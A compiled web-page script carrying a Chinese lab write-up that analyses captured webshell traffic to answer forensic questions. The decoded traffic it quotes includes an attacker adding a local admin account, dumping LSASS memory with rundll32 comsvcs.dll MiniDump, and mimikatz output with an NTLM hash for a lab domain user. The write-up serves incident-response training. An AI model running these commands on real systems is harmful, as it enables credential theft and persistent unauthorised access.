"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[5089],{25886:(n,e,i)=>{i.r(e),i.d(e,{assets:()=>r,contentTitle:()=>t,default:()=>l,frontMatter:()=>d,metadata:()=>a,toc:()=>o});var s=i(85893),c=i(11151);const d={},t="\u7b2c\u516d\u7ae0 \u6d41\u91cf\u7279\u5f81\u5206\u6790 - \u8682\u8681\u7231\u4e0a\u6811",a={id:"Xuanji/Unit-6/44",title:"\u7b2c\u516d\u7ae0 \u6d41\u91cf\u7279\u5f81\u5206\u6790 - \u8682\u8681\u7231\u4e0a\u6811",description:"1",source:"@site/docs/Xuanji/Unit-6/44.md",sourceDirName:"Xuanji/Unit-6",slug:"/Xuanji/Unit-6/44",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-6/44",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-6/44.md",tags:[],version:"current",frontMatter:{},sidebar:"Xuanji_Sidebar",previous:{title:"\u7b2c\u516d\u7ae0 \u6d41\u91cf\u7279\u5f81\u5206\u6790 - \u8681\u5251\u6d41\u91cf\u5206\u6790",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-6/32"},next:{title:"\u7b2c\u516d\u7ae0 \u6d41\u91cf\u7279\u5f81\u5206\u6790 - waf \u4e0a\u7684\u622a\u83b7\u7684\u9ed1\u5ba2\u653b\u51fb\u6d41\u91cf",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-6/45"}},r={},o=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2}];function p(n){const e={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,c.a)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"\u7b2c\u516d\u7ae0-\u6d41\u91cf\u7279\u5f81\u5206\u6790---\u8682\u8681\u7231\u4e0a\u6811",children:"\u7b2c\u516d\u7ae0 \u6d41\u91cf\u7279\u5f81\u5206\u6790 - \u8682\u8681\u7231\u4e0a\u6811"}),"\n",(0,s.jsx)(e.h2,{id:"1",children:"1"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u7ba1\u7406\u5458 Admin \u8d26\u53f7\u7684\u5bc6\u7801\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u8ffd\u8e2a\u6d41\u91cf\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0 webshell \u4ea4\u4e92\u6d41\u91cf"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:i(61962).Z+"",width:"1711",height:"1553"})}),"\n",(0,s.jsx)(e.p,{children:"\u5bf9\u6d41\u91cf\u8fdb\u884c\u5206\u6790\u89e3\u7801\uff0c\u5f97\u5230\u4ea4\u4e92"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:'$ cd /d "C:/phpStudy/PHPTutorial/WWW/onlineshop"&ls&echo [S]&cd&echo [E]\n[S]\nC:\\phpStudy\\PHPTutorial\\WWW\\onlineshop\n[E]\n7d32eb2bb\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u8ffd\u8e2a\u6d41\u91cf\uff0c\u89e3\u7801\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u8fc7\u7a0b"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:'$ cd /d "C:/phpStudy/PHPTutorial/WWW/onlineshop"&ls&echo [S]&cd&echo [E]\n[S]\nC:\\phpStudy\\PHPTutorial\\WWW\\onlineshop\n[E]\n7d32eb2bb\n$ cd /d "C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop"&dir&echo [S]&cd&echo [E]\n C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop ......\n\n2023/10/19  12:31    <DIR>          .\n2023/10/19  12:31    <DIR>          ..\n2022/09/28  00:47                50 .gitattributes\n2022/09/28  00:47    <DIR>          .github\n2022/09/28  00:47            26,083 action.php\n2022/09/28  00:47    <DIR>          admin\n2022/09/28  00:47            21,774 body.php\n2022/09/28  00:47               206 cart.php\n2022/09/28  00:47             8,148 checkout.php\n2022/09/28  00:47             2,693 checkout_process.php\n2022/09/28  00:47                63 CNAME\n2022/09/28  00:47             2,973 config.php\n2022/09/28  00:47    <DIR>          css\n2022/09/28  00:47    <DIR>          database\n2023/10/19  11:59               276 db.php\n2022/09/28  00:47               180 error.php\n2022/09/28  00:47    <DIR>          fonts\n2022/09/28  00:47             5,691 footer.php\n2022/09/28  00:47            11,771 header.php\n2022/09/28  00:47             5,892 homeaction.php\n2022/09/28  00:47    <DIR>          img\n2022/09/28  00:47               108 index.php\n2022/09/28  00:47    <DIR>          js\n2022/09/28  00:47            11,351 LICENSE\n2022/09/28  00:47             4,256 login.php\n2022/09/28  00:47               257 logout.php\n2022/09/28  00:47             8,453 myorders.php\n2022/09/28  00:47             1,317 newslettter.php\n2022/09/28  00:47             1,656 offersmail.php\n2022/09/28  00:47             2,761 order_successful.php\n2022/09/28  00:47             2,802 payment_success.php\n2022/09/28  00:47            14,879 product.php\n2023/10/19  12:30                31 product2.php\n2022/09/28  00:47             3,828 products.php\n2022/09/28  00:47    <DIR>          product_images\n2022/09/28  00:47             7,500 README.md\n2022/09/28  00:47             3,764 register.php\n2022/09/28  00:47             1,159 review.php\n2022/09/28  00:47             6,838 review_action.php\n2022/09/28  00:47    <DIR>          screenshot\n2022/09/28  00:47             5,319 signin_form.php\n2022/09/28  00:47             4,454 signup_form.php\n2022/09/28  00:47             3,751 store.php\n2022/09/28  00:47                84 topheader\n2022/09/28  00:47               206 wishlist.php\n2022/09/28  00:47                26 _config.yml\n              35 ......        170,600 ....\n              11 ......  1,584,734,208 ........\n[S]\nC:\\phpStudy\\PHPTutorial\\WWW\\onlineshop\n[E]\n200d58f72\n$ cd /d "C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop"&net localgroup administrators&echo [S]&cd&echo [E]\nadministrators\n....     ............../........................\n\n....\n\n-------------------------------------------------------------------------------\nAdministrator\nVULNTARGET\\Domain Admins\nVULNTARGET\\win101\nwin10\n..............\n\n[S]\nC:\\phpStudy\\PHPTutorial\\WWW\\onlineshop\n[E]\n15d52e5c65\n$ cd /d "C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop"&net user admin Password1 /add&echo [S]&cd&echo [E]\n......\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u5b9a\u4f4d\u5230"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:'cd /d "C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop"&net user admin Password1 /add&echo [S]&cd&echo [E]\n'})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{Password1}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"2",children:"2"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"LSASS.exe \u7684\u7a0b\u5e8f\u8fdb\u7a0b ID \u662f\u591a\u5c11\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u5b9a\u4f4d\u5230"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:i(67731).Z+"",width:"2560",height:"1542"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:'$ cd /d "C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop"&rundll32.exe comsvcs.dll, MiniDump 852 C:\\Temp\\OnlineShopBackup.zip full&echo [S]&cd&echo [E]\n[S]\nC:\\phpStudy\\PHPTutorial\\WWW\\onlineshop\n[E]\n7c1f43cd\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\u6839\u636e ",(0,s.jsx)(e.code,{children:"MiniDump"})," \u4f20\u5165\u7684\u53c2\u6570 ",(0,s.jsx)(e.code,{children:"852"})," \u53ef\u4ee5\u5f97\u5230\u7b54\u6848"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{852}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"3",children:"3"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u7528\u6237 WIN101 \u7684\u5bc6\u7801\u662f\u4ec0\u4e48?"}),"\n"]}),"\n",(0,s.jsxs)(e.p,{children:["\u5728\u6d41\u91cf\u4e2d\uff0c\u53ef\u4ee5\u6293\u5230\u83b7\u53d6 ",(0,s.jsx)(e.code,{children:"C:/Temp/OnlineShopBack.zip"})," \u6587\u4ef6\u7684\u6d41\u91cf"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:i(11756).Z+"",width:"2560",height:"1542"})}),"\n",(0,s.jsx)(e.p,{children:"\u6587\u4ef6\u5934\u5f88\u660e\u663e\u7684 Process Dump\uff0c\u5c06\u5176\u8fdb\u884c\u5bfc\u51fa\u540e"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:i(36587).Z+"",width:"2559",height:"1371"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(e.code,{children:"mimikatz"})," \u8fdb\u884c\u5206\u6790"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"SID               : S-1-5-21-3374851086-947483859-3378876003-1103\n        msv :\n         [00000003] Primary\n         * Username : win101\n         * Domain   : VULNTARGET\n         * NTLM     : 282d975e35846022476068ab5a3d72df\n         * SHA1     : bc9ecca8d006d8152bd51db558221a0540c9d604\n         * DPAPI    : 8d6103509e746ac0ed9641f7c21d7cf7\n        tspkg :\n        wdigest :\n         * Username : win101\n         * Domain   : VULNTARGET\n         * Password : (null)\n        kerberos :\n         * Username : win101\n         * Domain   : VULNTARGET.COM\n         * Password : (null)\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 995 (00000000:000003e3)\nSession           : Service from 0\nUser Name         : IUSR\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2023/10/19 11:26:36\nSID               : S-1-5-17\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u5bf9\u5f97\u5230\u7684 ",(0,s.jsx)(e.code,{children:"NTLM"})," \u54c8\u5e0c ",(0,s.jsx)(e.code,{children:"282d975e35846022476068ab5a3d72df"}),"\u5728\u7ebf\u67e5\u8868"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:i(99571).Z+"",width:"2559",height:"1371"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{admin#123}\n"})})]})}function l(n={}){const{wrapper:e}={...(0,c.a)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(p,{...n})}):p(n)}},61962:(n,e,i)=>{i.d(e,{Z:()=>s});const s=i.p+"assets/images/image_20240618-211804-3bb4c2dabdfeef077ebd7f35c8269d56.png"},36587:(n,e,i)=>{i.d(e,{Z:()=>s});const s=i.p+"assets/images/image_20240618-221821-240bd722501feb2cf5fab830459fc3c6.png"},67731:(n,e,i)=>{i.d(e,{Z:()=>s});const s=i.p+"assets/images/image_20240633-213337-7a5b64cba85814a98b7704e74b7c0c6c.png"},11756:(n,e,i)=>{i.d(e,{Z:()=>s});const s=i.p+"assets/images/image_20240639-213929-69c3e9b714b8200b437a8b48b13c66c1.png"},99571:(n,e,i)=>{i.d(e,{Z:()=>s});const s=i.p+"assets/images/image_282d975e35846022476068ab5a3d72df-161e8e0666d3462081942d84a406df8a.png"},11151:(n,e,i)=>{i.d(e,{Z:()=>a,a:()=>t});var s=i(67294);const c={},d=s.createContext(c);function t(n){const e=s.useContext(d);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(c):n.components||c:t(n.components),s.createElement(d.Provider,{value:e},n.children)}}}]);